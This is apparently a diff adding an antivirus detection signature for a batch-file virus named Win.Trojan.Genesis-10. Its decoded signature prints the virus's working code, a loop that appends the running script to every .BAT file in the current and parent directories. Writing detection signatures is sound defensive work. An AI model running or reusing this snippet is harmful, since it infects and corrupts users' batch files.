@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Trojan.Genesis-10
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+@ECHO OFF
+FOR %%i IN (*.BAT ../*.BAT) do COPY %%i+%0 %%i>nul
